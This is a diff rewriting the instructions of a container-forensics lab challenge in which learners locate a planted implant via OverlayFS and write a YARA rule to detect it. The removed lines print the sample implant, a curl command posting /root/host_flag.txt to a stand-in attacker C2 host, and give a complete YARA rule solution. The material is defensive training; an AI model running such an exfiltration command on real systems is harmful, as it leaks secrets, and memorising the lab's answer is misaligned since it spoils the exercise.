@@ -1,142 +1,81 @@
-# Challenge 3: DFIR Triage & YARA Threat Hunting
+# Challenge 3: Container DFIR & YARA Threat Hunting
 
-## 📖 Background & Forensic Concepts
+## Digital Forensics Context: Ephemeral Storage Triage
 
-During a security incident involving containerized workloads, the Digital Forensics and Incident Response (DFIR) team must analyze the compromised container's filesystem and create detection signatures for threat hunting.
+During incident response engagements involving containerized workloads, entering a compromised container to execute investigation tools is an operational anti-pattern. Untrusted binaries within the container may be trojanized, and process execution alters volatile memory and timestamp metadata.
 
-### Understanding OverlayFS in Container Forensics
+Container digital forensics relies on host-level inspection of the underlying storage driver.
 
-Docker uses the **OverlayFS** union mount filesystem to manage container layers:
-- **`lowerdir`**: Read-only layers representing the immutable base image.
-- **`upperdir`**: The writable **Copy-on-Write (CoW)** layer created when the container starts. Any files created, modified, or deleted by attackers or processes inside the container live exclusively in this directory on the host!
-- **`merged`**: The unified mountpoint presented to the running container processes.
-
-As a forensic analyst, you can inspect a container's `UpperDir` directly on the host host filesystem without entering the container or relying on potentially backdoored utilities.
-
-### Threat Hunting with YARA
-
-**YARA** is the de facto standard tool for pattern matching and malware identification. In DevSecOps and DFIR operations, YARA rules are used in automated CI/CD artifact scanning and runtime endpoint detection agents to detect malicious payloads, web shells, and C2 exfiltration scripts.
-
-A standard YARA rule consists of four primary blocks:
-```yara
-rule Rule_Name {
-    meta:
-        description = "Brief summary of detection logic"
-        author      = "Analyst Name"
-    strings:
-        $string_identifier = "target sequence"
-    condition:
-        $string_identifier
-}
-```
-
----
-
-## 🛠️ Step-by-Step Instructions
-
-### 1. (Optional) Inspect the Container's OverlayFS Layer
-
-From the host terminal, inspect the storage driver metadata of `cicd_runner_pipeline`:
-
-```bash
-docker inspect cicd_runner_pipeline | jq '.[0].GraphDriver.Data'
-```
-
-Notice the `UpperDir` path. This path on your host filesystem contains every modification written to the container since it booted, including the malicious implant placed at `/var/log/pipeline_audit/backdoor_implant.sh`.
-
-### 2. Inspect the Forensic Evidence
-
-For forensic triage, the security operations center (SOC) has mirrored the suspicious artifact to `/evidence/backdoor_implant.sh`. 
-
-Navigate to the evidence directory and review the file:
-
-```bash
-cd /evidence
-cat backdoor_implant.sh
-```
-
-You will see the adversary's exfiltration logic:
-
-```bash
-#!/bin/sh
-# Malicious Exfiltration Hook
-curl -X POST -d @/root/host_flag.txt http://evil-c2.attacker.internal/exfil
-```
-
-Identify the core **Indicators of Compromise (IoCs)**:
-1. Malicious comment string: `# Malicious Exfiltration Hook`
-2. Command and Control (C2) endpoint: `http://evil-c2.attacker.internal`
-
-### 3. Create the YARA Detection Rule
-
-Create a new YARA rule file at `/evidence/detect_implant.yar`:
-
-```bash
-nano /evidence/detect_implant.yar
-```
-
-Or write the rule directly from the command line using `cat`:
-
-```bash
-cat << "EOF" > /evidence/detect_implant.yar
-rule Malicious_CI_CD_Exfiltration_Hook {
-    meta:
-        description = "Detects malicious pipeline exfiltration implant targeting host credentials"
-        author      = "CPIFP Alan Turing DFIR Team"
-        date        = "2026-10-02"
-        severity    = "Critical"
-        mitre_technique = "T1059.004, T1552.003"
-    strings:
-        $c2_domain = "http://evil-c2.attacker.internal" ascii
-        $hook_comment = "# Malicious Exfiltration Hook" ascii
-    condition:
-        $c2_domain and $hook_comment
-}
-EOF
-```
-
-Verify that `/evidence/detect_implant.yar` was created correctly:
-
-```bash
-cat /evidence/detect_implant.yar
-```
-
-### 4. Test and Execute the YARA Rule
-
-Run YARA against the target evidence sample:
-
-```bash
-yara /evidence/detect_implant.yar /evidence/backdoor_implant.sh
-```
-
-If the rule matches, YARA will print the rule identifier followed by the file path:
 ```text
-Malicious_CI_CD_Exfiltration_Hook /evidence/backdoor_implant.sh
+OverlayFS Mount Structure
+├── lowerdir (Read-Only)  : Immutable base image layers.
+├── upperdir (Read-Write) : Ephemeral copy-on-write (CoW) delta layer containing all
+│                           files created, modified, or staged for deletion during runtime.
+└── merged                : Virtual union mount visible to container processes.
 ```
 
-To see the exact byte offset and matching strings, use the `-s` flag:
-
-```bash
-yara -s /evidence/detect_implant.yar /evidence/backdoor_implant.sh
-```
-
-You should see each string identifier (`$c2_domain`, `$hook_comment`) matched with its offset in the target script.
+By extracting the `UpperDir` location from container engine metadata on the host, incident responders can perform static triage on all adversary modifications without interacting with the container runtime.
 
 ---
 
-## 🔍 DevSecOps Key Takeaway
+## Technical Objectives
 
-> **How does this fit into DevSecOps?**
-> In a production CI/CD pipeline, YARA rules are integrated into:
-> - **Pre-Commit / Pre-Merge Scanners**: Scanning repositories and submodules for known attack patterns before code reaches production.
-> - **Artifact Repository Scans**: Scanning container images in Harbor, AWS ECR, or Google Artifact Registry before deployment.
-> - **Runtime EDR / eBPF Sensors**: Tools such as **Tetragon**, **Falco**, and **Tracee** match process arguments and file writes against threat signatures in real time.
+1. Determine the storage driver architecture and locate the dynamic `UpperDir` for `cicd_runner_pipeline` using host Docker inspection utilities.
+2. Identify an attacker-dropped persistence or exfiltration script introduced into the container's mutable filesystem layer.
+3. Review the forensic staging copy located at `/evidence/backdoor_implant.sh`.
+4. Engineer an enterprise-grade YARA rule at `/evidence/detect_implant.yar` targeting the unique characteristics and network indicators of the implant.
+5. Validate that your rule compiles cleanly and accurately detects the sample using `yara(1)`.
 
 ---
 
-## ✅ Verification
+## Investigation Vectors and Execution Guidelines
 
-Click the **Check** button below or run the verification script directly from your terminal:
+### OverlayFS Metadata Triage
+Query Docker Engine metadata for `cicd_runner_pipeline` from the host. Specifically, inspect the `.GraphDriver.Data` object using `docker inspect` and `jq` or Docker Go template formatting. Locate the host filesystem path corresponding to `UpperDir`.
+
+Examine this directory on the host. Because `UpperDir` stores file creations and modifications relative to the container root (`/`), search for newly created shell scripts, audit logs, or executable artifacts placed in non-standard locations (such as `/var/log` or administrative directories).
+
+### Evidence Inspection
+An identical copy of the suspicious artifact has been preserved in the forensic evidence directory: `/evidence/backdoor_implant.sh`.
+
+Perform static analysis on this artifact:
+- Determine the interpreter and execution context.
+- Identify the exfiltration mechanism, data sources targeted, and external Command and Control (C2) network destinations.
+- Identify specific ASCII string sequences that uniquely identify this malicious script and distinguish it from benign administrative shell scripts.
+
+### YARA Rule Engineering
+Construct a syntactically valid YARA rule file located at `/evidence/detect_implant.yar`.
+
+A robust YARA rule must satisfy the following structural requirements:
+- **`rule` identifier**: A distinct, descriptive rule name adhering to YARA identifier syntax.
+- **`meta` section**: Administrative metadata including description, author, reference date, and threat classification.
+- **`strings` section**: Distinct string declarations. You must define patterns that match the hardcoded C2 infrastructure (the attacker domain/endpoint) and the explicit exfiltration hook comments found in the script. Avoid overly generic terms (like `#!/bin/sh` or `curl`) that would cause false-positive matches across standard system utilities.
+- **`condition` section**: Boolean logic ensuring all relevant indicators must be satisfied for a positive detection.
+
+### Syntax and Detection Testing
+Validate your rule against the evidence sample using the `yara` CLI utility:
+
+```text
+Command Reference: yara [options] rule_file target_file
+Useful Flags:
+  -s  Print matching string identifiers and offsets.
+  -c  Print match counts only.
+```
+
+Ensure the execution returns exit code `0` and explicitly outputs the rule match against `/evidence/backdoor_implant.sh`.
+
+---
+
+## Verification Requirements
+
+Confirm that your rule file is saved at `/evidence/detect_implant.yar` and correctly flags the target script:
+
+```text
+Rule Path:   /evidence/detect_implant.yar
+Target File: /evidence/backdoor_implant.sh
+```
+
+Execute the automated verification check:
 
 ```bash
 /step3/verify.sh
